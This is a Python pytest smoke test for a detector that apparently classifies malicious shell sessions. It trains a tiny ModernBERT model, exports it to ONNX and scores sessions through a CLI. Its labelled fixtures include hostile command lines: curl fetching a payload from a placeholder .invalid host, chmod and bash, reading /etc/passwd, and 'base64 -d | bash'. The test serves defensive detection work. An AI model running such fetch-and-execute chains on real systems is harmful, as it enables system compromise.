"""Opt-in end-to-end training smoke: data -> train -> export -> CLI.

The real pipeline fine-tunes a 150M-parameter backbone, which is far too slow
for the default test run.  Set ``CMDRISK_E2E=1`` to exercise the same code path
against a tiny randomly-initialized ModernBERT checkpoint instead.
"""

from __future__ import annotations

import json
import os
import subprocess
import sys
from pathlib import Path

import pytest

pytestmark = pytest.mark.skipif(
    os.environ.get("CMDRISK_E2E") != "1",
    reason="set CMDRISK_E2E=1 to run the tiny end-to-end training smoke",
)

torch = pytest.importorskip("torch")
pytest.importorskip("transformers")
pytest.importorskip("onnxruntime")
pytest.importorskip("onnxscript")
pytest.importorskip("accelerate")
pytest.importorskip("tokenizers")

from tokenizers import Tokenizer, models, pre_tokenizers  # noqa: E402
from transformers import ModernBertConfig, ModernBertModel, PreTrainedTokenizerFast  # noqa: E402

from cmdrisk.tokenization import SPECIAL_TOKENS, CommandTokenizer  # noqa: E402
from cmdrisk.training.config import TrainingRunConfig  # noqa: E402
from cmdrisk.training.export import export_onnx  # noqa: E402
from cmdrisk.training.pipeline import run_training  # noqa: E402

FIXTURES = Path(__file__).parent / "fixtures" / "model"

WORDS = (
    "whoami",
    "uname",
    "-a",
    "id",
    "cat",
    "/etc/passwd",
    "curl",
    "wget",
    "tar",
    "xf",
    "chmod",
    "+x",
    "base64",
    "-d",
    "|",
    "bash",
    "apt-get",
    "install",
    "python",
    "-c",
    "/tmp/a",
    "https://example.invalid/a",
)


def _tiny_tokenizer(max_length: int = 64) -> CommandTokenizer:
    vocabulary = ["[PAD]", "[UNK]", "[CLS]", "[SEP]", "[MASK]", *SPECIAL_TOKENS, *WORDS]
    tokens: list[str] = []
    for token in vocabulary:
        if token not in tokens:
            tokens.append(token)
    backend = Tokenizer(
        models.WordLevel(
            vocab={token: index for index, token in enumerate(tokens)}, unk_token="[UNK]"
        )
    )
    backend.pre_tokenizer = pre_tokenizers.Whitespace()
    fast = PreTrainedTokenizerFast(
        tokenizer_object=backend,
        unk_token="[UNK]",
        pad_token="[PAD]",
        cls_token="[CLS]",
        sep_token="[SEP]",
        mask_token="[MASK]",
    )
    return CommandTokenizer(fast, max_length=max_length, command_max_tokens=8)


def _build_tiny_backbone(root: Path) -> None:
    values = json.loads(
        (FIXTURES / "tiny_modernbert_config.json").read_text(encoding="utf-8")
    )
    backbone = ModernBertModel(ModernBertConfig(**values))
    backbone.save_pretrained(root)
    _tiny_tokenizer().save_pretrained(root)


def _session(
    session_id: str,
    family_id: str,
    split: str,
    source_kind: str,
    commands: list[str],
    *,
    malicious: bool,
    first_evidence_index: int | None = None,
    techniques: list[str] | None = None,
    tactics: list[str] | None = None,
) -> dict:
    return {
        "session_id": session_id,
        "family_id": family_id,
        "split": split,
        "source": {"kind": source_kind},
        "commands": [{"cmd": command, "dt": index} for index, command in enumerate(commands)],
        "label": {
            "malicious": int(malicious),
            "first_evidence_index": first_evidence_index,
            "techniques": techniques or [],
            "technique_evidence": (
                {technique: [first_evidence_index] for technique in techniques or []}
                if first_evidence_index is not None
                else {}
            ),
            "tactics": tactics or [],
        },
    }


def _records() -> list[dict]:
    malicious = [
        (
            "curl -o /tmp/a https://example.invalid/a",
            [
                "whoami",
                "uname -a",
                "id",
                "curl -o /tmp/a https://example.invalid/a",
                "chmod +x /tmp/a",
                "bash",
            ],
            3,
        ),
        (
            "base64 -d | bash",
            ["whoami", "cat /etc/passwd", "base64 -d | bash"],
            2,
        ),
    ]
    benign = [
        ["whoami", "uname -a"],
        ["apt-get install python"],
        ["cat /etc/passwd"],
        ["id", "uname -a", "whoami"],
    ]
    records: list[dict] = []
    for index, (family, commands, evidence) in enumerate(malicious):
        for split in ("train", "dev", "test"):
            records.append(
                _session(
                    f"m{index}-{split}",
                    family,
                    split,
                    "real_malicious",
                    commands,
                    malicious=True,
                    first_evidence_index=evidence,
                    techniques=["T1105", "T1082"],
                    tactics=["TA0011", "TA0007"],
                )
            )
    for index, commands in enumerate(benign):
        for split in ("train", "dev", "test"):
            records.append(
                _session(
                    f"b{index}-{split}",
                    f"benign{index}",
                    split,
                    "script_benign",
                    commands,
                    malicious=False,
                )
            )
    # Hard negatives look like attack chains but are ordinary installer work.
    for split in ("train", "dev", "test"):
        records.append(
            _session(
                f"hn-{split}",
                "installer",
                split,
                "hard_negative",
                ["tar xf /tmp/a", "chmod +x /tmp/a", "python -c", "apt-get install python"],
                malicious=False,
            )
        )
    records.append(
        _session(
            "ood-2024-test",
            "ood-2024",
            "test",
            "real_benign",
            ["whoami"],
            malicious=False,
        )
        | {"year": 2024}
    )
    return records


def test_tiny_pipeline_train_export_and_cli_score(tmp_path: Path) -> None:
    backbone = tmp_path / "backbone"
    _build_tiny_backbone(backbone)

    data_path = tmp_path / "sessions.jsonl"
    data_path.write_text(
        "\n".join(json.dumps(record) for record in _records()) + "\n", encoding="utf-8"
    )

    output_dir = tmp_path / "run"
    config = TrainingRunConfig(
        data_path=str(data_path),
        output_dir=str(output_dir),
        model_name=str(backbone),
        max_epochs=1,
        short_max_length=24,
        long_max_length=40,
        command_max_tokens=8,
        max_prefixes=3,
        min_technique_sessions=1,
        min_technique_families=1,
        calibration_fpr=0.5,
        dataloader_num_workers=0,
        vram_gb=0.0,
        phase_overrides={
            "short": {"max_steps": 1, "logging_steps": 1},
            "long": {"max_steps": 1, "logging_steps": 1},
        },
    )
    final_dir = run_training(config)

    assert (output_dir / "calibration.json").is_file()
    assert (output_dir / "label_vocabulary.json").is_file()
    metrics = json.loads((output_dir / "metrics.json").read_text(encoding="utf-8"))
    for section in (
        "malicious",
        "tactic",
        "technique",
        "detection_delay",
        "slices",
        "promotion",
    ):
        assert section in metrics
    for key in (
        "pr_auc",
        "roc_auc",
        "brier",
        "ece",
        "recall_ci_low",
        "recall_ci_high",
    ):
        assert key in metrics["malicious"]
    assert set(metrics["slices"]) == {
        "real_only",
        "real_plus_semi_real",
        "synthetic_stress",
        "ood_2024",
    }
    calibration = json.loads((output_dir / "calibration.json").read_text(encoding="utf-8"))
    assert 0.0 <= calibration["malicious_threshold"] <= 1.0

    artifact = tmp_path / "artifact"
    manifest = export_onnx(
        checkpoint=final_dir,
        output_dir=artifact,
        tokenizer_source=final_dir,
        calibration_path=output_dir / "calibration.json",
        metrics_path=output_dir / "metrics.json",
    )
    assert manifest["int8_model"] == "model.int8.onnx"
    assert json.loads((artifact / "metrics.json").read_text(encoding="utf-8")) == metrics

    score_input = tmp_path / "score.jsonl"
    score_input.write_text(
        json.dumps(
            {
                "session_id": "s1",
                "commands": ["whoami", "uname -a", "curl -o /tmp/a https://example.invalid/a"],
            }
        )
        + "\n",
        encoding="utf-8",
    )
    scored = subprocess.run(
        [
            sys.executable,
            "-m",
            "cmdrisk.cli",
            "score",
            "--artifact-dir",
            str(artifact),
            "--input",
            str(score_input),
        ],
        capture_output=True,
        text=True,
        check=False,
    )
    assert scored.returncode == 0, scored.stderr
    payload = json.loads(scored.stdout.strip().splitlines()[-1])
    assert payload["session_id"] == "s1"
    assert 0.0 <= payload["peak_probability"] <= 1.0

    streamed = subprocess.run(
        [
            sys.executable,
            "-m",
            "cmdrisk.cli",
            "stream",
            "--session-id",
            "live",
            "--artifact-dir",
            str(artifact),
        ],
        input="\n".join(
            json.dumps({"cmd": command, "dt": index})
            for index, command in enumerate(["whoami", "uname -a", "id"])
        )
        + "\n",
        capture_output=True,
        text=True,
        check=False,
    )
    assert streamed.returncode == 0, streamed.stderr
    steps = [json.loads(line) for line in streamed.stdout.strip().splitlines()]
    assert [step["command_index"] for step in steps] == [0, 1, 2]
